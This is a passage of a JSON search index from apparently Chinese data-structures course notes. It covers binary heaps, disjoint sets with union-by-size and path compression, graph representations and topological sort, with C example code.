"\u4e8c\u53c9\u5806 | binary heap", "text": "<ul> <li>\u4e8c\u53c9\u5806\u662f\u4e00\u79cd\u5b8c\u5168\u4e8c\u53c9\u6811 \u2014\u2014 \u4efb\u610f\u8282\u70b9\u7684\u503c\u90fd \\(\\le\\) (\u6216 \\(\\ge\\) ) \u7236\u8282\u70b9\u7684\u503c(\u5373\u6700\u5927\u6700\u5c0f\u5806)</li> </ul> <p>\u5f15\u7533</p> <ul> <li>D-heap | D-\u5806 \u662f\u6307\u6bcf\u4e2a\u8282\u70b9\u6709 d \u4e2a\u513f\u5b50<ul> <li>\u82e5D-\u5806\u4f7f\u7528\u6570\u7ec4\u5b58\u50a8\uff0c\u4e14\u4e00\u4e2a\u8282\u70b9\u7684\u4e0b\u6807\u4e3a i (\u6839\u7ed3\u70b9 i = 1)</li> <li>\u5176\u7236\u8282\u70b9\u7684\u4f4d\u7f6e\u662f \\(\\lfloor (i + d - 2)/d \\rfloor\\) (\u4e0d\u5927\u4e8e\u5176\u7684\u6700\u5927\u6574\u6570)</li> <li>\u5176\u7b2c\u4e00\u4e2a\u513f\u5b50\u4f4d\u4e8e \\((i - 1)d + 2\\) </li> <li>\u6700\u540e\u4e00\u4e2a\u513f\u5b50\u4f4d\u4e8e \\(id + 1\\) </li> </ul> </li> </ul> \u4e00\u9053 PTA \u4f8b\u9898 <p></p>"}, {"location": "Course/FDS/Lec03/#_13", "title": "\u5806\u7684\u64cd\u4f5c", "text": "<p>\u4ee5\u6700\u5927\u5806\u4e3a\u4f8b</p> <ol> <li>\u6700\u5927\u5806\u7684\u521b\u5efa <pre><code>typedef struct HeapStruct *MaxHeap;\nstruct HeapStruct{\n    ElementType *Elements;  /*\u5b58\u50a8\u5806\u5143\u7d20\u7684\u6570\u7ec4*/\n    int Size;   /*\u5806\u7684\u5f53\u524d\u5143\u7d20\u4e2a\u6570*/\n    int Capacity;   /*\u5806\u7684\u6700\u5927\u5bb9\u91cf*/\n};\n\nMaxHeap Create( int MaxSize )\n{\n    MaxHeap H = malloc(sizeof( struct HeapStruct));\n    H-&gt;Elements = malloc((MaxSize+1) * sizeof(ELementType));\n    H-&gt;Size = 0;\n    H-&gt;Capacity = MaxSize;\n    H-&gt;Elements[0] = MaxData;\n        /*\u5b9a\u4e49\u201c\u54e8\u5175\u201d\u4e3a\u5927\u4e8e\u5806\u4e2d\u6240\u6709\u53ef\u80fd\u5143\u7d20\u7684\u503c\uff0c\u4fbf\u4e8e\u4ee5\u540e\u66f4\u5feb\u64cd\u4f5c*/\n    return H;\n}\n</code></pre></li> <li>\u63d2\u5165\u2014\u2014\u5148\u653e\u5230\u6700\u540e\u4e00\u4e2a\u4f4d\u7f6e\uff0c\u7136\u540e\u548c\u7236\u8282\u70b9\u6bd4\u8f83\u4ea4\u6362\u00b7\u00b7\u00b7 <pre><code>void Insert(MaxHeap H, ElementType item)\n{\n    /*\u5c06\u5143\u7d20item\u63d2\u5165\u5230\u6700\u5927\u5806H\uff0c\u5176\u4e2dH-&gt;Elements[0]\u5df2\u7ecf\u5b9a\u4e49\u4e3a\u54e8\u5175*/\n    int i;\n    if(IsFull(H))\n    {\n        printf(\"\u6700\u5927\u5806\u5df2\u6ee1\");\n        return ;\n    }\n    i = ++H-&gt;Size;  /*i\u6307\u5411\u63d2\u5165\u540e\u5806\u4e2d\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u7684\u4f4d\u7f6e*/\n    for(; H-&gt;Elements[i/2] &lt; item; i /=2)\n        H-&gt;Elements[i] = H-&gt;Elements[i/2];  /*\u5411\u4e0b\u8fc7\u6ee4\u8282\u70b9*/\n    H-&gt;Elements[i] = item;  /*\u5c06item\u63d2\u5165*/\n}\n</code></pre> <p><code>H-&gt;Elements[0]</code> \u662f\u54e8\u5175\u5143\u7d20\uff0c\u5b83\u4e0d\u5c0f\u4e8e\u5806\u4e2d\u7684\u6700\u5927\u5143\u7d20\uff0c\u63a7\u5236\u5faa\u73af\u7ed3\u675f</p> </li> <li>\u5220\u9664\u2014\u2014\u5c06\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u653e\u5230\u6839\u8282\u70b9\uff0c\u7136\u540e\u548c\u513f\u5b50\u6bd4\u8f83\u4ea4\u6362\u00b7\u00b7\u00b7 <pre><code>ElementType DeleteMax( MaxHeap H)\n{\n    /*\u4ece\u6700\u5927\u5806H\u4e2d\u53d6\u51fa\u952e\u503c\u4e3a\u6700\u5927\u7684\u5143\u7d20\uff0c\u5e76\u5220\u9664\u4e00\u4e2a\u8282\u70b9*/\n    int Parent, Child;\n    ElementType MaxItem, temp;\n    if( IsEmpty(H))\n    {\n        printf(\"\u6700\u5927\u5806\u5df2\u4e3a\u7a7a\");\n        return ;\n    }\n    MaxItem = H-&gt;Elements[1];   /*\u53d6\u51fa\u6839\u8282\u70b9\u6700\u5927\u503c*/\n    /*\u7528\u6700\u5927\u5806\u4e2d\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u4ece\u6839\u8282\u70b9\u5f00\u59cb\u5411\u4e0a\u8fc7\u6ee4\u4e0b\u5c42\u8282\u70b9*/\n    temp = H-&gt;Elements[H-&gt;Size--];\n    for( Parent=1; Parent*2 &lt;= H-&gt;Size; Parent = Child)\n    {\n        Child = Parent * 2;\n        if((Child != H-&gt;Size) &amp;&amp; \n        (H-&gt;Elements[Child] &lt; H-&gt;Elements[Child+1]))\n            Child ++;   /*Child\u6307\u5411\u5de6\u53f3\u5b50\u8282\u70b9\u7684\u8f83\u5927\u8005*/\n\n        if( temp &gt;= H-&gt;Elements[Child])\n            break;\n        else    /*\u79fb\u52a8temp\u5143\u7d20\u5230\u4e0b\u4e00\u5c42*/\n            H-&gt;Elements[Parent] = H-&gt;Elements[Child];\n    }\n    H-&gt;Elements[Parent] = temp;\n    return MaxItem;\n}\n</code></pre></li> <li>Percolate: \u81ea\u4e0a\u800c\u4e0b\u6216\u81ea\u4e0b\u800c\u4e0a\u5806\u5316(\u5c06\u5143\u7d20\u5411\u4e0a\u6216\u5411\u4e0b\u79fb\u52a8)<ul> <li>\u53ef\u4ee5\u5b9e\u73b0\u975e\u6700\u503c\u5143\u7d20\u7684\u5220\u9664</li> </ul> </li> <li>\u6784\u5efa\u4e00\u4e2a\u5806 \u2014\u2014 \u5c06\u5df2\u5b58\u5728\u7684 N \u4e2a\u5143\u7d20\u6309\u5806\u8981\u6c42\u5b58\u653e\u5230\u4e00\u4e2a\u4e00\u7ef4\u6570\u7ec4<ul> <li>\u901a\u8fc7\u63d2\u5165\u64cd\u4f5c\uff0c\u5c06 N \u4e2a\u5143\u7d20\u76f8\u7ee7\u63d2\u5165\u5230\u4e00\u4e2a\u521d\u59cb\u5316\u4e3a\u7a7a\u7684\u6808\u4e2d\uff0c\u65f6\u95f4\u4ee3\u4ef7\u6700\u5927\u4e3a \\(O(NlogN)\\) </li> <li>\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(N)\\) \u7684\u5efa\u7acb\u65b9\u6cd5<ol> <li>\u5c06 N \u4e2a\u5143\u7d20\u6309\u8f93\u5165\u987a\u5e8f\u5b58\u5165\uff0c\u5148\u6ee1\u8db3\u5b8c\u5168\u4e8c\u53c9\u6811\u7684\u7ed3\u6784\u7279\u6027</li> <li>\u8c03\u6574\u8282\u70b9\u4f4d\u7f6e\uff0c\u5373\u8fdb\u884c Percolate \u64cd\u4f5c\u4ee5\u6ee1\u8db3\u6700\u5927\u5806\u7684\u6709\u5e8f\u7279\u6027</li> </ol> </li> </ul> </li> </ol> \u5b8c\u6574\u4ee3\u7801 <pre><code>typedef struct HNode *Heap; /* \u5806\u7684\u7c7b\u578b\u5b9a\u4e49 */\nstruct HNode {\n    ElementType *Data; /* \u5b58\u50a8\u5143\u7d20\u7684\u6570\u7ec4 */\n    int Size;          /* \u5806\u4e2d\u5f53\u524d\u5143\u7d20\u4e2a\u6570 */\n    int Capacity;      /* \u5806\u7684\u6700\u5927\u5bb9\u91cf */\n};\ntypedef Heap MaxHeap; /* \u6700\u5927\u5806 */\ntypedef Heap MinHeap; /* \u6700\u5c0f\u5806 */\n\n#define MAXDATA 1000  /* \u8be5\u503c\u5e94\u6839\u636e\u5177\u4f53\u60c5\u51b5\u5b9a\u4e49\u4e3a\u5927\u4e8e\u5806\u4e2d\u6240\u6709\u53ef\u80fd\u5143\u7d20\u7684\u503c */\n\nMaxHeap CreateHeap( int MaxSize )\n{ /* \u521b\u5efa\u5bb9\u91cf\u4e3aMaxSize\u7684\u7a7a\u7684\u6700\u5927\u5806 */\n\n    MaxHeap H = (MaxHeap)malloc(sizeof(struct HNode));\n    H-&gt;Data = (ElementType *)malloc((MaxSize+1)*sizeof(ElementType));\n    H-&gt;Size = 0;\n    H-&gt;Capacity = MaxSize;\n    H-&gt;Data[0] = MAXDATA; /* \u5b9a\u4e49\"\u54e8\u5175\"\u4e3a\u5927\u4e8e\u5806\u4e2d\u6240\u6709\u53ef\u80fd\u5143\u7d20\u7684\u503c*/\n\n    return H;\n}\n\nbool IsFull( MaxHeap H )\n{\n    return (H-&gt;Size == H-&gt;Capacity);\n}\n\nbool Insert( MaxHeap H, ElementType X )\n{ /* \u5c06\u5143\u7d20X\u63d2\u5165\u6700\u5927\u5806H\uff0c\u5176\u4e2dH-&gt;Data[0]\u5df2\u7ecf\u5b9a\u4e49\u4e3a\u54e8\u5175 */\n    int i;\n\n    if ( IsFull(H) ) { \n        printf(\"\u6700\u5927\u5806\u5df2\u6ee1\");\n        return false;\n    }\n    i = ++H-&gt;Size; /* i\u6307\u5411\u63d2\u5165\u540e\u5806\u4e2d\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u7684\u4f4d\u7f6e */\n    for ( ; H-&gt;Data[i/2] &lt; X; i/=2 )\n        H-&gt;Data[i] = H-&gt;Data[i/2]; /* \u4e0a\u6ee4X */\n    H-&gt;Data[i] = X; /* \u5c06X\u63d2\u5165 */\n    return true;\n}\n\n#define ERROR -1 /* \u9519\u8bef\u6807\u8bc6\u5e94\u6839\u636e\u5177\u4f53\u60c5\u51b5\u5b9a\u4e49\u4e3a\u5806\u4e2d\u4e0d\u53ef\u80fd\u51fa\u73b0\u7684\u5143\u7d20\u503c */\n\nbool IsEmpty( MaxHeap H )\n{\n    return (H-&gt;Size == 0);\n}\n\nElementType DeleteMax( MaxHeap H )\n{ /* \u4ece\u6700\u5927\u5806H\u4e2d\u53d6\u51fa\u952e\u503c\u4e3a\u6700\u5927\u7684\u5143\u7d20\uff0c\u5e76\u5220\u9664\u4e00\u4e2a\u8282\u70b9 */\n    int Parent, Child;\n    ElementType MaxItem, X;\n\n    if ( IsEmpty(H) ) {\n        printf(\"\u6700\u5927\u5806\u5df2\u4e3a\u7a7a\");\n        return ERROR;\n    }\n\n    MaxItem = H-&gt;Data[1]; /* \u53d6\u51fa\u6839\u8282\u70b9\u5b58\u653e\u7684\u6700\u5927\u503c */\n    /* \u7528\u6700\u5927\u5806\u4e2d\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u4ece\u6839\u8282\u70b9\u5f00\u59cb\u5411\u4e0a\u8fc7\u6ee4\u4e0b\u5c42\u8282\u70b9 */\n    X = H-&gt;Data[H-&gt;Size--]; /* \u6ce8\u610f\u5f53\u524d\u5806\u7684\u89c4\u6a21\u8981\u51cf\u5c0f */\n    for( Parent=1; Parent*2&lt;=H-&gt;Size; Parent=Child ) {\n        Child = Parent * 2;\n        if( (Child!=H-&gt;Size) &amp;&amp; (H-&gt;Data[Child]&lt;H-&gt;Data[Child+1]) )\n            Child++;  /* Child\u6307\u5411\u5de6\u53f3\u5b50\u8282\u70b9\u7684\u8f83\u5927\u8005 */\n        if( X &gt;= H-&gt;Data[Child] ) break; /* \u627e\u5230\u4e86\u5408\u9002\u4f4d\u7f6e */\n        else  /* \u4e0b\u6ee4X */\n            H-&gt;Data[Parent] = H-&gt;Data[Child];\n    }\n    H-&gt;Data[Parent] = X;\n\n    return MaxItem;\n} \n\n/*----------- \u5efa\u9020\u6700\u5927\u5806 -----------*/\nvoid PercDown( MaxHeap H, int p )\n{ /* \u4e0b\u6ee4\uff1a\u5c06H\u4e2d\u4ee5H-&gt;Data[p]\u4e3a\u6839\u7684\u5b50\u5806\u8c03\u6574\u4e3a\u6700\u5927\u5806 */\n    int Parent, Child;\n    ElementType X;\n\n    X = H-&gt;Data[p]; /* \u53d6\u51fa\u6839\u8282\u70b9\u5b58\u653e\u7684\u503c */\n    for( Parent=p; Parent*2&lt;=H-&gt;Size; Parent=Child ) {\n        Child = Parent * 2;\n        if( (Child!=H-&gt;Size) &amp;&amp; (H-&gt;Data[Child]&lt;H-&gt;Data[Child+1]) )\n            Child++;  /* Child\u6307\u5411\u5de6\u53f3\u5b50\u8282\u70b9\u7684\u8f83\u5927\u8005 */\n        if( X &gt;= H-&gt;Data[Child] ) break; /* \u627e\u5230\u4e86\u5408\u9002\u4f4d\u7f6e */\n        else  /* \u4e0b\u6ee4X */\n            H-&gt;Data[Parent] = H-&gt;Data[Child];\n    }\n    H-&gt;Data[Parent] = X;\n}\n\nvoid BuildHeap( MaxHeap H )\n{ /* \u8c03\u6574H-&gt;Data[]\u4e2d\u7684\u5143\u7d20\uff0c\u4f7f\u6ee1\u8db3\u6700\u5927\u5806\u7684\u6709\u5e8f\u6027  */\n/* \u8fd9\u91cc\u5047\u8bbe\u6240\u6709H-&gt;Size\u4e2a\u5143\u7d20\u5df2\u7ecf\u5b58\u5728H-&gt;Data[]\u4e2d */\n\n    int i;\n\n    /* \u4ece\u6700\u540e\u4e00\u4e2a\u8282\u70b9\u7684\u7236\u8282\u70b9\u5f00\u59cb\uff0c\u5230\u6839\u8282\u70b91 */\n    for( i = H-&gt;Size/2; i&gt;0; i-- )\n        PercDown( H, i );\n}\n</code></pre>"}, {"location": "Course/FDS/Lec03/#disjoint-set", "title": "\u5e76\u67e5\u96c6 | disjoint set", "text": "<p>Abstract</p> <p>\u5e76\u67e5\u96c6\u662f\u4e00\u79cd\u6570\u636e\u7ed3\u6784\uff0c\u652f\u6301\u4e24\u79cd\u64cd\u4f5c: </p> <ul> <li>Union | \u5408\u5e76\u96c6\u5408</li> <li>Find | \u67e5\u8be2\u5143\u7d20\u6240\u5728\u96c6\u5408</li> </ul> <p>\u5e76\u67e5\u96c6\u4e2d\u96c6\u5408\u5b58\u50a8\u7684\u4e24\u79cd\u5b9e\u73b0: </p> <ul> <li>\u6811\u7ed3\u6784\u5b58\u50a8: \u6811\u7684\u6bcf\u4e00\u4e2a\u8282\u70b9\u4ee3\u8868\u4e00\u4e2a\u96c6\u5408\u5143\u7d20</li> </ul> <p>Example</p> <p></p> <ul> <li>\u6570\u7ec4\u5b58\u50a8: \u5c06\u6570\u7ec4\u4e2d\u6bcf\u4e2a\u5143\u7d20\u7684\u7c7b\u578b\u63cf\u8ff0\u4e3a <pre><code>typedef struct{\n    ElementType Data;\n    int Parent;\n}SetType;\n</code></pre></li> </ul> <p>Example</p> <p></p>"}, {"location": "Course/FDS/Lec03/#find_1", "title": "\u96c6\u5408\u8fd0\u7b97 \u2014\u2014 Find", "text": "<p>\u67e5\u627e\u67d0\u4e2a\u5143\u7d20\u6240\u5728\u96c6\u5408(\u7528\u6839\u8282\u70b9\u8868\u793a)</p> <pre><code>int Find( SetType S[], ELementType X)\n{\n    /*\u5728\u6570\u7ec4S\u4e2d\u67e5\u627e\u503c\u4e3aX\u7684\u5143\u7d20\u6240\u5c5e\u7684\u96c6\u5408*/\n    /*MaxSize\u662f\u5168\u5c40\u53d8\u91cf\uff0c\u4e3a\u6570\u7ec4S\u7684\u6700\u5927\u957f\u5ea6*/\n    int i;\n    for( i=0; i &lt; MaxSize &amp;&amp; S[i].Data != X; i++);\n    if( i &gt;= MaxSize )\n        return -1;  /*\u672a\u627e\u5230X,\u8fd4\u56de -1*/\n    for( ; S[i].Parent &gt;= 0; i = S[i].Parent);\n    return i;   /*\u627e\u5230X\u6240\u5c5e\u7684\u96c6\u5408\uff0c\u8fd4\u56de\u6811\u6839\u8282\u70b9\u5728\u6570\u7ec4S\u4e2d\u7684\u4e0b\u6807*/ \n}\n</code></pre>"}, {"location": "Course/FDS/Lec03/#union", "title": "\u96c6\u5408\u8fd0\u7b97 \u2014\u2014 Union", "text": "<ol> <li>\u5206\u522b\u627e\u5230 X1 \u548c X2 \u4e24\u4e2a\u5143\u7d20\u6240\u5728\u96c6\u5408\u6811\u7684\u6839\u8282\u70b9</li> <li>\u82e5\u4e0d\u540c\u6839\uff0c\u5219\u5c06\u5176\u4e2d\u4e00\u4e2a\u6839\u8282\u70b9\u7684\u7236\u8282\u70b9\u7684\u6570\u7ec4\u4e0b\u6807\u8bbe\u4e3a\u53e6\u4e00\u6839\u8282\u70b9\u7684\u6570\u7ec4\u4e0b\u6807 <pre><code>void Union( SetType S[], ElementType X1, ElementType X2)\n{\n    int Root1, Root2;\n    Root1 = Find(S, X1);\n    Root2 = Find(S, X2);\n    if( Root1 != Root2)\n        S[Root2].Parent = Root1;\n}\n</code></pre> <p>\u4e3a\u6539\u5584\u5408\u5e76\u540e\u7684\u67e5\u627e\u6027\u80fd\uff0c\u53ef\u4ee5\u91c7\u7528\u5c06\u5c0f\u7684\u96c6\u5408\u5408\u5e76\u5230\u76f8\u5bf9\u5927\u7684\u96c6\u5408\u4e2d(\u5e76\u7528\u5229\u7528\u6570\u7ec4\u4e0b\u6807\u63d0\u793a\u96c6\u5408\u4e2d\u5143\u7d20\u6570\u91cf) \u56fe\u7247\u6458\u81ea MOOC</p> </li> </ol>"}, {"location": "Course/FDS/Lec03/#smart-union-union-by-size", "title": "Smart Union \u2014\u2014 Union-by-Size", "text": "<ul> <li>\u6309\u5927\u5c0f\u5408\u5e76 (union-by-size) \u59cb\u7ec8\u5c06\u5c0f\u7684\u6811\u5408\u5e76\u5230\u5927\u7684\u6811\u4e0a\uff0c\u8fdb\u800c\u51cf\u5c0f\u6811\u7684\u9ad8\u5ea6</li> <li>\u4ee4 S[root] = -size (size \u8868\u793a\u6811\u7684\u5927\u5c0f\u5e76\u521d\u59cb\u5316\u4e3a -1)</li> </ul> <p>Lemma</p> <ul> <li>Let \\(T\\) be a tree created by union-by-size with N nodes, then \\(height(T) \\le \\lfloor log_2N \\rfloor + 1\\)</li> <li>Proof: \u901a\u8fc7\u5f52\u7eb3\u6cd5\uff0c\u6bcf\u4e2a\u5143\u7d20\u7684\u96c6\u5408\u540d\u6700\u591a\u66f4\u6539 \\(log_2 N\\) \u6b21</li> <li>\u4e14 N \u6b21 union \u548c M \u6b21 find \u64cd\u4f5c\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O( N + M log_2 N )\\) </li> </ul> Quote <p></p> <p>\u5728\u6570\u7ec4\u4e2d\u91c7\u7528\u6811\u7684\u5927\u5c0f\u7684\u8d1f\u503c\u6765\u8bb0\u5f55\uff0c\u4ee5\u8bc1\u660e\u82e5\u4f7f\u7528\u6309\u5927\u5c0f\u6c42\u5e76\u5219\u8fde\u7eed M \u6b21\u8fd0\u7b97\u9700\u8981 \\(O(M)\\) \u5e73\u5747\u65f6\u95f4\u3002\u8fd9\u662f\u56e0\u4e3a\u5f53\u968f\u673a\u7684 Union \u6267\u884c\u65f6\u6574\u4e2a\u7b97\u6cd5\u4e00\u822c\u53ea\u6709\u4e00\u4e9b\u5f88\u5c0f\u7684\u96c6\u5408\uff08\u901a\u5e38\u542b\u4e00\u4e2a\u5143\u7d20\uff09\u4e0e\u5927\u96c6\u5408\u5408\u5e76\u3002</p>"}, {"location": "Course/FDS/Lec03/#smart-union-union-by-height", "title": "Smart Union \u2014\u2014 Union-by-Height", "text": "<ul> <li>\u6309\u9ad8\u5ea6\u5408\u5e76 (union-by-height) \u59cb\u7ec8\u5c06\u6d45\u7684\u6811\u6210\u4e3a\u6df1\u7684\u6811</li> <li>\u540c\u6837\u4fdd\u8bc1\u4e86\u6240\u6709\u7684\u6811\u7684\u6df1\u5ea6\u6700\u591a\u662f \\(O(log N)\\) </li> </ul> Quote"}, {"location": "Course/FDS/Lec03/#path-compression", "title": "\u8def\u5f84\u538b\u7f29 | Path Compression", "text": "<ul> <li>\u8def\u5f84\u538b\u7f29\u5728\u4e00\u6b21 Find \u64cd\u4f5c\u671f\u95f4\u6267\u884c\u3002\u8bbe\u64cd\u4f5c\u4e3a Find(X)\uff0c\u6b64\u65f6\u8def\u5f84\u538b\u7f29\u7684\u6548\u679c\u662f: \u4ece X \u5230\u6839\u7684\u8def\u5f84\u4e0a\u7684\u6bcf\u4e00\u4e2a\u8282\u70b9\u90fd\u4f7f\u5176\u7236\u8282\u70b9\u53d8\u6210\u6839\u3002 <pre><code>SetType Find(ElementType X, DisjSet S)\n{\n    return (S[X] &lt;= 0) ? X : S[X] = Find(S[X], S);\n}\n</code></pre></li> <li>\u8def\u5f84\u538b\u7f29\u5bf9\u4e8e\u57fa\u672c\u7684 Find \u64cd\u4f5c\u552f\u4e00\u7684\u53d8\u5316\u662f\u4f7f\u5f97 S[X] \u7b49\u4e8e\u7531 Find \u8fd4\u56de\u7684\u503c</li> <li>\u5728\u96c6\u5408\u7684\u6839\u88ab\u9012\u5f52\u627e\u5230\u540e\uff0c X \u5c31\u76f4\u63a5\u6307\u5411\u5b83\uff0c\u56e0\u6b64\u5b9e\u73b0\u8def\u5f84\u538b\u7f29</li> </ul>"}, {"location": "Course/FDS/Lec04/", "title": "\u56fe | Graph", "text": "<p> \u7ea6 2019 \u4e2a\u5b57  591 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 14 \u5206\u949f</p>"}, {"location": "Course/FDS/Lec04/#definitions", "title": "Definitions", "text": "<ol> <li>Length of a path: \u8def\u5f84\u4e0a\u8fb9\u7684\u6570\u76ee</li> <li>Simple path: Path \u4e2d\u7684\u70b9 v<sub>i1</sub>, v<sub>i2</sub>, \u00b7\u00b7\u00b7, v<sub>in</sub> \u90fd\u4e0d\u540c</li> <li>\u65e0\u5411\u56fe<ol> <li>connected: \u82e5\u5b58\u5728\u4e00\u6761\u4ece v<sub>i</sub> \u5230 v<sub>j</sub> \u7684\u8def\u5f84\uff0c\u5219\u79f0 v<sub>i</sub> \u548c v<sub>j</sub> \u8fde\u901a</li> <li>connected graph: \u4efb\u610f\u70b9\u4e4b\u95f4\u90fd\u8fde\u901a\uff0c\u79f0\u65e0\u5411\u56fe\u662f\u8fde\u901a\u7684</li> <li>connected component: \u65e0\u5411\u56fe\u7684\u6781\u5927\u8fde\u901a\u5b50\u56fe</li> </ol> </li> <li>tree: \u8fde\u901a\u7684\u65e0\u73af\u56fe</li> <li>DAG: directed acyclic graph | \u6709\u5411\u65e0\u73af\u56fe </li> <li>Strongly connected component: \u6709\u5411\u56fe\u7684\u6781\u5927\u5f3a\u8fde\u901a\u5b50\u56fe</li> <li>Degree(v): <ol> <li>\u5bf9\u6709\u5411\u56fe\uff0c\u5ea6\u5206\u4e3a\u5165\u5ea6\u548c\u51fa\u5ea6</li> <li>\u5bf9\u65e0\u5411\u56fe\uff0c\u5ea6\u6570\u662f\u4e0e\u5176\u76f8\u90bb\u7684\u8282\u70b9\u6570</li> <li>\u8fb9\u6570\u7b49\u4e8e\u6240\u6709\u8282\u70b9\u7684\u5ea6\u6570\u548c\u9664\u4ee5 2</li> </ol> </li> </ol>"}, {"location": "Course/FDS/Lec04/#_1", "title": "\u56fe\u7684\u8868\u793a", "text": "<ol> <li>\u90bb\u63a5\u77e9\u9635 G[N][N] \u2014\u2014 N \u4e2a\u9876\u70b9\u4ece 0 \u5230 N-1 \u7f16\u53f7<ul> <li>G[i][j] = &lt; v<sub>i</sub>, v<sub>j</sub> &gt; \u662f G \u4e2d\u7684\u8fb9 ? 1 : 0</li> </ul> </li> </ol> <p>Tip</p> <ul> <li>\u5bf9\u4e8e\u65e0\u5411\u56fe\u7684\u5b58\u50a8\uff0c\u7528\u4e00\u4e2a\u957f\u5ea6\u4e3a N(N+1)/2 \u7684\u4e00\u7ef4\u6570\u7ec4 A \u5b58\u50a8 {G<sub>00</sub>, G<sub>10</sub>, G<sub>11</sub>, \u00b7\u00b7\u00b7, G<sub>(n-1)0</sub>, \u00b7\u00b7\u00b7, G<sub>(n-1)(n-1)</sub>}, \u5219 G<sub>ij</sub> \u5728 A \u4e2d\u5bf9\u5e94\u7684\u4e0b\u6807\u662f: i * (i + 1) / 2 + j</li> <li>\u5bf9\u4e8e\u7f51\u7edc\uff0c\u53ea\u8981\u628a G[i][j] \u7684\u503c\u5b9a\u4e49\u4e3a\u8fb9 &lt; v<sub>i</sub>, v<sub>j</sub> &gt; \u7684\u6743\u91cd\u5373\u53ef</li> </ul> <ol> <li>\u90bb\u63a5\u8868\u8868\u793a\u6cd5 \u2014\u2014 G[N] \u4e3a\u6307\u9488\u6570\u7ec4\uff0c\u5bf9\u5e94\u77e9\u9635\u6bcf\u884c\u8981\u7ed9\u94fe\u8868\u4e14\u53ea\u5b58\u975e 0 \u5143\u7d20 <ul> <li>\u5bf9\u4e8e\u65e0\u5411\u56fe\uff0c\u6bcf\u4e2a\u8fb9\u4f1a\u88ab\u5b58\u50a8\u4e24\u6b21</li> <li>\u5bf9\u4e8e\u6709\u5411\u56fe\uff0c\u65e0\u6cd5\u904d\u5386\u5165\u5ea6\uff0c\u5982\u679c\u8981\u67e5\u8be2\u5165\u5ea6\u53ef\u91c7\u7528\u4ee5\u4e0b\u4e24\u79cd\u65b9\u6cd5:<ul> <li>\u589e\u52a0\u9006\u90bb\u63a5\u8868  </li> <li>\u91c7\u7528\u591a\u91cd\u94fe\u8868  </li> </ul> </li> </ul> </li> </ol>"}, {"location": "Course/FDS/Lec04/#_2", "title": "\u62d3\u6251\u6392\u5e8f", "text": "<p>Abstract</p> <ul> <li>AOV \u7f51\u7edc \u2014\u2014 \u5b9a\u70b9\u8868\u793a\u6d3b\u52a8\uff0c\u8fb9\u8868\u793a\u5148\u540e\u5173\u7cfb</li> <li>\u82e5\u5b58\u5728\u4e00\u6761\u4ece i \u5230 j \u7684\u8def\u5f84\uff0c\u5219\u79f0 i \u4e3a j  \u7684\u524d\u9a71 (predecessor), j \u662f i \u7684\u540e\u7ee7 (successor)</li> <li>\u82e5\u5b58\u5728\u4e00\u6761\u8fb9 &lt; i, j &gt;\uff0c\u5219\u79f0 i \u662f j \u7684\u76f4\u63a5\u524d\u9a71 (immediate predecessor) \uff0cj \u662f i \u7684\u76f4\u63a5\u540e\u7ee7</li> </ul>"}, {"location": "Course/FDS/Lec04/#_3", "title": "\u62d3\u6251\u5e8f", "text": "<ul> <li>\u82e5\u5728\u56fe\u4e2d\u4ece V \u5230 W \u6709\u4e00\u6761\u6709\u5411\u8def\u5f84\uff0c\u5219 V \u4e00\u5b9a\u6392\u5728 W \u4e4b\u524d\u3002\u6ee1\u8db3\u6b64\u6761\u4ef6\u7684\u9876\u70b9\u5e8f\u5217\u79f0\u4e3a\u4e00\u4e2a\u62d3\u6251\u5e8f (\u83b7\u5f97\u4e00\u4e2a\u62d3\u6251\u5e8f\u7684\u8fc7\u7a0b\u5c31\u662f\u62d3\u6251\u6392\u5e8f)</li> <li>AOV \u5982\u679c\u6709\u5408\u7406\u7684\u62d3\u6251\u5e8f\uff0c\u5219\u5fc5\u5b9a\u662f\u6709\u5411\u65e0\u73af\u56fe (Directed Acyclic Graph, DAG) <p> \u5982\u679c\u6709\u5411\u56fe\u4e2d\u51fa\u73b0\u73af\uff0c\u4e00\u5b9a\u4e0d\u53ef\u80fd\u5f97\u5230\u4e00\u4e2a\u5408\u7406\u7684\u62d3\u6251\u5e8f</p> </li> </ul>"}, {"location": "Course/FDS/Lec04/#_4", "title": "\u62d3\u6251\u6392\u5e8f\u7b97\u6cd5", "text": "<pre><code>void Topsort(Graph G)\n{\n      int Counter;\n      Vertex V, W;\n      for(Counter = 0; Counter &lt; NumVertex; Counter ++)\n      {\n            V = FindNeVertexOfDegreeZero();     /* O(|V|) */\n            if(V == NotAVertex)\n            {\n                  Error(\"Graph has a cycle\");\n                  break;\n            }\n            TopNum[V] = Counter;    /*or output V*/\n            for(each W adjacent to V)\n                  Indegree[W] --;\n      }\n}\n</code></pre> <ul> <li>\u4e0a\u8ff0\u7b97\u6cd5\u7684\u65f6\u95f4\u590d\u6742\u5ea6 $T = O(|V|^2) $</li> <li>Improvement: \u968f\u65f6\u5c06\u5165\u5ea6\u53d8\u4e3a 0 \u7684\u9876\u70b9\u653e\u5230\u4e00\u4e2a\u5bb9\u5668\u4e2d(\u6808\u6216\u961f\u5217\u7b49)</li> </ul> Improvement<pre><code>void Topsort( Graph G )\n{   \n      Queue  Q;\n      int  Counter = 0;\n      Vertex  V, W;\n      Q = CreateQueue( NumVertex );  \n      MakeEmpty( Q );\n      for ( each vertex V )\n            if ( Indegree[ V ] == 0 )   \n                  Enqueue( V, Q );\n      while ( !IsEmpty( Q ) )\n      {\n            V = Dequeue( Q );\n            TopNum[ V ] = ++ Counter; /* assign next */\n            for ( each W adjacent to V )\n                  if ( \u2013 \u2013 Indegree[ W ] == 0 )  \n                        Enqueue( W, Q );\n      }  /* end-while */\n      if ( Counter != NumVertex )\n            Error( \u201cGraph has a cycle\u201d );\n\n      DisposeQueue( Q ); /* free memory */}\n</code></pre> <p>\u82e5\u6709\u73af\u5219\u4e00\u5b9a\u4f1a\u5b58\u5728\u627e\u4e0d\u5230\u5165\u5ea6\u4e3a 0 \u7684\u70b9\uff0c\u6765\u8fdb\u5165\u6784\u6210\u73af\u7684\u5b50\u56fe</p> \u90bb\u63a5\u8868\u5b58\u50a8\u2014\u62d3\u6251\u6392\u5e8f\u7b97\u6cd5 <pre><code>bool TopSort( LGraph Graph, Vertex 